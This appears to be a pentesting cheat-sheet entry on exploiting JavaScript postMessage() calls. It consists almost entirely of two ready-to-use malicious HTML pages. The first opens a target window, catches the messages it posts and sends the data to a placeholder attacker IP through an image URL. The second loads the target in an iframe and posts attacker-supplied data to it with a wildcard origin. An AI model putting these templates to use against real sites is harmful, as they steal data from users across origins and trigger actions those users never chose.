
# postMessage() JavaScript Calls

If no CSRF token and no destination is present for the function, create a malicious HTML page that can leak information  

```html
<html>
        <body>
                <script>
                        window.addEventListener('message', function(event) {
                                document.write('<img src="http://<ATTACKER-IP>/?leak=' + event.data.value + '"></img>');}, false);

                        window.open('http://<TARGET>/key/0');
                </script>
        </body>
</html>
```

If CSRF protections are present, try loading an iFrame  

```html
<html>
<body>
<iframe id="frame" onload="hack()" src="http://<TARGET>/"></iframe>
<script>
function hack(){
        setTimeout(function() { document.getElementById("frame").contentWindow.postMessage('<POST-DATA>', '*'); // the wildcard is for the destination, send to all
                },2000);
};
        
</script>
</body>
</html>

```
